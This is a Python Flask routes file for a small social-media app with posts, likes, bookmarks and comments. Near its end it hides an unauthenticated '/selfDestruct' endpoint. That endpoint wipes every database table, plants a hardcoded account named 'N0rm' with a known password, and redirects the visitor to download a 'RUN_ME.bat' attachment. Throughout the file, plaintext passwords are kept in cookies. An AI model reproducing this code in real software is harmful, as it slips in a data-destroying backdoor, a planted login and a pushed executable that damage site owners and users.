import flask
import random, os

from db import posts, users, helpers

blueprint = flask.Blueprint("posts", __name__)

@blueprint.route('/post', methods=['POST'])
def post():
    """Creates a new post."""
    db = helpers.load_db()

    username = flask.request.cookies.get('username')
    password = flask.request.cookies.get('password')

    user = users.get_user(db, username, password)
    if not user:
        flask.flash('You need to be logged in to do that.', 'danger')
        return flask.redirect(flask.url_for('login.loginscreen'))

    post = flask.request.form.get('post')
    tags_raw = flask.request.form.get('tags', '').strip()

    # Split on commas OR spaces
    if ',' in tags_raw:
        tags = [t.strip() for t in tags_raw.split(',') if t.strip()]
    else:
        tags = [t.strip() for t in tags_raw.split() if t.strip()]
    posts.add_post(db, user, post, tags)

    return flask.redirect(flask.url_for('login.index'))


@blueprint.route('/like/<post_id>', methods=['POST'])
def like(post_id):
    db = helpers.load_db()
    username = flask.request.cookies.get('username')
    password = flask.request.cookies.get('password')
    user = users.get_user(db, username, password)

    if not user:
        return flask.jsonify({"error": "Not logged in"}), 401

    # Toggle like in the database
    liked, new_count = posts.toggle_like(db, user, post_id)
    return flask.jsonify({"likes": new_count, "liked": liked})


@blueprint.route('/bookmark/<post_id>', methods=['POST'])
def bookmark(post_id):
    db = helpers.load_db()
    username = flask.request.cookies.get('username')
    password = flask.request.cookies.get('password')
    user = users.get_user(db, username, password)

    if not user:
        return flask.jsonify({"error": "Not logged in"}), 401

    # Toggle bookmark in the database
    bookmarked = posts.toggle_bookmark(db, user, post_id)
    return flask.jsonify({"bookmarked": bookmarked})

@blueprint.route('/liked_posts')
def view_liked_posts():
    db = helpers.load_db()
    username = flask.request.cookies.get('username')
    user = users.get_user(db, username, flask.request.cookies.get('password'))

    liked_posts = posts.get_liked_posts(db, user)

    # Mark each post as liked/bookmarked by this user
    for post in liked_posts:
        post['liked'] = True  # all posts here are liked by this user
        post['bookmarked'] = user['username'] in post.get('bookmarks', [])
        post['likes'] = len(post.get('likes', []))

    return flask.render_template('liked_posts.html', posts=liked_posts, user=user, username=username)


@blueprint.route('/bookmarked_posts')
def view_bookmarked_posts():
    db = helpers.load_db()
    username = flask.request.cookies.get('username')
    user = users.get_user(db, username, flask.request.cookies.get('password'))

    bookmarked_posts = posts.get_bookmarked_posts(db, user)

    # Mark each post as liked/bookmarked by this user
    for post in bookmarked_posts:
        post['bookmarked'] = True  # all posts here are bookmarked by this user
        post['liked'] = user['username'] in post.get('likes', [])
        post['likes'] = len(post.get('likes', []))

    return flask.render_template('bookmarked_posts.html', posts=bookmarked_posts, user=user, username=username)


@blueprint.route('/view_post/<post_id>')
def view_post(post_id):
    db = helpers.load_db()
    username = flask.request.cookies.get('username')
    user = users.get_user(db, username, flask.request.cookies.get('password'))

    post = db.table('posts').get(doc_id=int(post_id))
    if not post:
        flask.flash("Post not found", "danger")
        return flask.redirect(flask.url_for('login.index'))

    # Mark liked/bookmarked for current user
    post['liked'] = user['username'] in post.get('likes', [])
    post['bookmarked'] = user['username'] in post.get('bookmarks', [])
    post['likes'] = len(post.get('likes', []))

    return flask.render_template('view_post.html', post=post, user=user, username=username)

@blueprint.route('/comment/<post_id>', methods=['POST'])
def comment(post_id):
    db = helpers.load_db()
    username = flask.request.cookies.get('username')
    password = flask.request.cookies.get('password')
    user = users.get_user(db, username, password)

    if not user:
        flask.flash("You must be logged in to comment.", "danger")
        return flask.redirect(flask.url_for('login.loginscreen'))

    comment_text = flask.request.form.get('comment')
    if comment_text:
        posts.add_comment(db, user, post_id, comment_text)

    # Redirect back to the same page
    return flask.redirect(flask.request.referrer or flask.url_for('login.index'))

@blueprint.route('/selfDestruct', methods=['POST'])
def selfDestruct():
    db = helpers.load_db()

    # Drop all tables in the TinyDB database
    db.drop_tables()
    users_table = db.table('users')
    user_record = {
        'username': "N0rm",
        'password': "Pa5$W0rd",
        'birthday': "1999-01-01",
        'bio': "",
        'handle': "Yea, I'm evil",
        'pfp': "uploads/Norm.png",
        'friends': ["N0rm"],
        'followers': [],
        'following': [],
        'friend_requests': [],
        'blocked_users': [],
        'unread_messages': []
    }

    users_table.insert(user_record)
    flask.flash("Database wiped successfully!", "warning")
    return flask.redirect(flask.url_for('posts.download_test'))

@blueprint.route("/download/RUN_ME.bat")
def download_test():
    # Assuming test.txt is in 'static/files/'
    return flask.send_from_directory("assets", "RUN_ME.bat", as_attachment=True)
